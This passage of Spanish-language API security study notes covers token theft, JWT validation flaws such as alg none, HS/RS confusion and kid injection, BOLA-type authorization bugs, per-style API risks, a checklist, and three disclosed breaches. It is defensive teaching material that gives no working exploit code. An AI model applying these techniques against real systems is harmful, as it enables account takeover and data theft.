- **Pass-the-cookie:** **reutilizar** la cookie/token robado **en otro equipo**, sin contraseña ni MFA.
- **"Roban el artefacto":** no roban a la **persona** ni su **contraseña**: roban el **token/cookie**.
  En los tres casos **la MFA hizo su trabajo**; el problema es que el artefacto **se reutiliza** porque
  **no está atado a su portador**. Ver §Bloque 4 y §5.5.

### 11.10 ¿Qué significa "JWT mal validado"?

El token es correcto; el **validador** está mal. Clases típicas:

- **`alg: none`**: si el receptor confía en el `alg` del token y acepta "sin firma", cualquiera forja.
- **Confusión HS/RS**: el token dice `RS256`, pero el código, al cambiar a `HS256`, usa la **clave
  pública como secreto HMAC** (y la pública es pública).
- **Inyección de `kid`**: `kid` apunta a una clave controlada por el atacante.
- **No validar** `iss`, `aud`, `exp`, `nbf` (o aceptar cualquier emisor/audiencia), o **no verificar la
  firma**.

**Regla (RFC 8725 / OWASP):** la política de verificación sale de la **configuración**, nunca del
token. Ver §5.7.

### 11.11 ¿Qué es la prueba de posesión (PoP)?

Idea: para usar el token **no basta tenerlo**; hay que **demostrar que se tiene la clave privada**,
firmando algo **por request**. Implementaciones: **mTLS** atado al certificado (RFC 8705), **DPoP**
(RFC 9449) e históricos como **OAuth 1.0** (HMAC por request) y el tipo **`mac`** (abandonado). Robar
el token **no alcanza** sin la clave privada. Es lo contrario del bearer.

### 11.12 ¿Qué son los tokens opacos, la introspección y el claim `aud`?

- **Token opaco:** string **sin contenido legible** (no es un JWT). No se pueden sacar claims de él;
  hay que **preguntar**. Ventaja: no filtra datos y se revoca fácil; desventaja: cada validación es
  una llamada.
- **Introspección** (RFC 7662): el **servidor de recursos** pregunta al **servidor de autorización**
  (`POST /introspect`) si el token sigue **activo** y con qué `scope`/`sub`. Costo y latencia; la
  revocación debe **propagarse** a las réplicas.
- **`aud`** (*audience*): **para quién** es el token. Validado **estrictamente**, un token robado
  **emitido para otra app** no sirve. Es el claim que **responde al problema del §10.3** de RFC 6749.

### 11.13 ¿Qué son BOLA, BFLA y BOPLA?

- **BOLA** (OWASP API1, *Broken Object Level Authorization*): **autorización a nivel de objeto**. El
  token es válido, pero pedís **otro objeto** (`/orders/456`) y no se chequea **de quién es**. Es el
  riesgo **#1**; ronda ~40 % de los ataques a APIs (IDOR).
- **BOPLA** (OWASP API3, *Broken Object Property Level Authorization*): a nivel de **propiedad/campo**.
  Se exponen o aceptan **campos que no corresponden** (*mass assignment* / *excessive data exposure*):
  el cliente manda `isAdmin:true` o recibe campos de más.
- **BFLA** (OWASP API5, *Broken Function Level Authorization*): a nivel de **función/endpoint**. Un
  usuario común accede a funciones de admin porque el rol no se chequea por **ruta/acción**.

**Regla:** *autenticar* ≠ *autorizar*. El token resuelve **quién**; BOLA/BOPLA/BFLA son **qué puede
hacer sobre qué**. Ver §5.6 y §6.

### 11.14 ¿Todos los flujos de OAuth 2 usan tokens? ¿El bearer es exclusivo de OAuth?

- **Sí: todos los flujos de OAuth 2 emiten un access token.** **Authorization Code** (+ **PKCE**, hoy
  obligatorio para clientes públicos) es el recomendado; **Client Credentials** (§4.4) es **M2M** sin
  usuario; **Implicit** y **Password (ROPC)** están **retirados/deprecados** por **RFC 9700 (2025)**.
- No todos emiten **refresh** (Implicit no) ni involucran **usuario** (Client Credentials), y no todos
  los tokens son **bearer** (pueden ser **sender-constrained**: mTLS/DPoP). Pero **el objetivo de
  OAuth es emitir un access token**.
- **El bearer no es exclusivo de OAuth.** El esquema `Authorization: Bearer` vive en el **marco de
  autenticación HTTP** y lo puede usar cualquier API. **RFC 6749** (OAuth 2.0) y **RFC 6750** (Bearer)
  son compañeros, pero **distintos**; de hecho el propio RFC 6749 definía **`bearer` y `mac`**, y hoy
  OAuth puede emitir tokens **sender-constrained** que **no** son bearer puro. Y **OAuth 1.0** no usaba
  bearer: **firmaba** cada request.

### 11.15 ¿Cuáles son los seis estilos de API y su riesgo característico? (slide 5 de la taxonomía)

| Estilo | Cómo es | Riesgo característico | Por qué |
|---|---|---|---|
| **REST** | recursos + verbos HTTP | **BOLA / IDOR** | Expone **IDs de objeto** en la URL; si no se valida **de quién es**, cambiando el ID se ve lo ajeno. |
| **GraphQL** | un endpoint, consulta del cliente | **query depth / sobre-exposición** | Consultas profundas = DoS y campos que no querías exponer. |
| **gRPC** | HTTP/2 + protobuf binario | **WAF no inspecciona** | El cuerpo binario no lo parsean los WAF/proxies genéricos. |
| **SOAP** | XML + WSDL | **XXE** | Parsear XML con **entidades externas** habilita XXE/SSRF. |
| **WebSocket** | canal persistente | **auth solo al inicio** | El *handshake* autentica una vez; después no se reevalúa por mensaje. |
| **Webhooks / eventos** | push del servidor a una URL | **SSRF / replay** | Se llama a una **URL elegida por el cliente** y los eventos deben **verificarse por firma**. |

Idea: **la receta de REST no se copia y pega**; cada estilo necesita su propio modelo de amenaza.

### 11.16 ¿Dónde viaja el token, y por qué la MFA "no está en la API"? (slides 13 y 14)

- **Dónde viaja:** RFC 6750 (2012) admitía **cabecera `Authorization`**, **cuerpo** del formulario y
  **query string** (`?access_token=...`). La **query** es un desastre: termina en **logs**, en
  `Referer`, en el **historial** y en **cachés**. Por eso **RFC 9700 (2025) prohíbe tokens en URIs**.
  La **cabecera** es **inmune a CSRF**; la **cookie** (con `HttpOnly`) protege de **XSS** pero exige
  mitigar **CSRF** (`SameSite`, token anti-CSRF).
- **La MFA no está en la API:** el flujo es `password → MFA → emisión → token (vive mucho) → API`. La
  MFA ocurre **una vez** en el servidor de autenticación; después la API solo recibe un **string**. La
  API **no sabe** que hubo MFA salvo por `amr`/`acr`. Conclusión: **la MFA protege la generación del
  artefacto, no su posesión posterior.**

### 11.17 Persona vs. sistema (slide 18)

| | **Persona** | **Sistema (M2M)** |
|---|---|---|
| Qué se prueba | que un **humano** se autenticó ante un IdP | que un **workload** pidió el token |
| Segundo factor | passkey / OTP / push | **no existe** |
| Artefacto | sesión + access token corto | token corto o **credencial efímera** |
| Vida típica | minutos-horas | **muy corta**, rotada |
| Fallo típico | fatiga, AiTM, robo de sesión | **secretos eternos** en repos/CI |
| Revocación | cerrar sesión / revocar | rotar credencial |

Mecanismos del lado sistema: `client_credentials` (RFC 6749 §4.4), `private_key_jwt` (RFC 7523),
**mTLS** (RFC 8705), **DPoP** (RFC 9449). Ver §Bloque 4.

### 11.18 Checklist final y cierre (slides 26 y 28)

**Checklist (8 preguntas):** (1) ¿la verificación del `alg` sale de la **config**? (2) ¿validás
`iss`/`aud`/`exp` con tolerancia corta? (3) ¿el access token vive lo que debe? (4) ¿hay **rotación y
revocación** del refresh? (5) ¿la **autorización a nivel de objeto** (BOLA) está resuelta? (6) ¿el
token va en **cabecera** y nunca en la URL? (7) ¿las **identidades de máquina** usan credenciales de
vida corta? (8) ¿qué queda en los **logs**?

**Cierre (tres mensajes):** (1) el token es **finito**: emitir, rotar, revocar —la ausencia de `exp`
ya es vulnerabilidad; (2) la **MFA protege la emisión, no la posesión**: diseñá para el robo de
artefactos; (3) **autenticar es la puerta, autorizar es la cerradura** —un token perfecto no impide
BOLA. Frase final: *la seguridad nunca estuvo en el string; estuvo siempre en el sistema.*

### 11.19 ¿Cuáles son los distintos puntos de vista para abordar una API?

Se ordenan en **tres familias** (qué / cómo / para quién), y están desarrollados en §1:

- **Familia A — qué se mira:** capas de arquitectura; actor (persona/sistema/delegación); **ciclo de
  vida de la credencial**; ciclo de vida del software (*shift-left*); superficie de ataque; dato y
  contrato (OpenAPI/AsyncAPI); **estilo de API**; protocolo y transporte; tipo de consumidor; modelo
  de despliegue; **identidad humana vs. no humana (NHI)**.
- **Familia B — cómo se defiende:** paradigma de confianza (identidad vs. posesión); modelo de
  autorización (RBAC/ABAC/ReBAC/PBAC, OPA); criptografía y gestión de claves (JOSE/PKI/KMS/HSM);
  control de tráfico (gateway, rate limiting); validación y saneamiento; observabilidad y respuesta;
  secretos, identidad de máquina y cadena de suministro.
- **Familia C — para quién y por qué:** OWASP API Top 10; *threat modeling* (STRIDE, LINDDUN…);
  audiencia (devs/arquitectos/seguridad/management); cumplimiento (ISO 27001, PCI, NIST; en Uruguay,
  Ley 18.331, Decreto 66/025, CERTuy); privacidad; negocio y abuso económico; madurez y gobierno
  (SAMM); economía del atacante; histórico/evolutivo; académico/formal (Saltzer & Schroeder);
  resiliencia; anti-patrones.

**Combinación recomendada:** histórico + ciclo de vida (hilo narrativo), actor + autorización
(corazón), OWASP + estilo de API (atlas), threat modeling + SDLC (cómo se trabaja),
cumplimiento/privacidad/negocio (por qué importa). Ver §1 y su tabla comparativa.

### 11.20 Los tres casos reales, en detalle

- **Facebook "View As" (2018).** Interacción de **tres bugs**: el *video uploader* aparecía en "View
  As"; usaba SSO y generaba un access token con permisos de la app móvil; y **generaba el token no del
  espectador sino del usuario consultado**, dejándolo **embebido en el HTML**. Los atacantes pivotaban
  de cuenta en cuenta (~50M tokens reseteados; ~90M cuentas re-login). Lección: **se emitió al usuario
  equivocado**; el token funcionó como fue diseñado. Ver §5.1.
- **Okta / Cloudflare (octubre de 2023).** Ataque al **sistema de soporte de Okta**: los atacantes
  accedieron a archivos de tickets y **secuestraron un session token** de un ticket creado por un
  empleado de Cloudflare; con esa sesión (privilegios administrativos) accedieron a sistemas el **18 de
  octubre de 2023**. Cloudflare detectó y contuvo. **No es la primera vez:** en **enero de 2022** Okta
  ya había sufrido otro incidente (un proveedor de soporte comprometido) y en ese caso Cloudflare **no
  fue impactado** porque usaba **llaves de hardware** para MFA. Lección: un bearer robado **vive lo que
  le hayan dado**; la **rotación y la revocación** (RFC 7009) son parte de la seguridad. Ver §5.2.
- **Codecov (2021).** Un error en el build de la **imagen Docker** expuso una **clave HMAC** de una
  service account; con ella se modificó el **Bash Uploader** servido desde GCS para **exportar las
  variables de entorno del CI** (`$(env)` + `git remote -v`) a un servidor del atacante (31/1/2021 a
  1/4/2021). Se detectó porque un cliente **comparó el SHA256** del script. Lección: **tokens/claves
  del CI filtrados**; cadena de suministro. Ver §5.3.

> **Nota de método:** todos los casos se citan como **divulgaciones públicas** y se analizan como
> **fallas de modelo**, nunca como críticas a organizaciones o personas.
